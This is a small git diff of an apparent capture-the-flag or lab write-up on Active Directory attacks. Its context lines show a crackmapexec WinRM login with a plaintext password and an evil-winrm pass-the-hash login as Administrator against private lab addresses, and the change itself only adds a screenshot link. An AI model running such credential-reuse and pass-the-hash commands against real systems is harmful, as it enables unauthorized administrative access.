@@ -184,7 +184,10 @@ crackmapexec winrm 10.10.35.127 -u svc-admin -p 'management2005'
 ## Evil-winrm Access as administrator using hash
 ```bash
 evil-winrm -i 10.10.163.232 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
-``` 
+```
+
+<img width="1440" height="761" alt="first_evil-winrm-AD-access" src="https://github.com/user-attachments/assets/2b5f15a7-b71c-4322-b51c-dd9d11cad72a" />
+
 
 
 ## Questions:
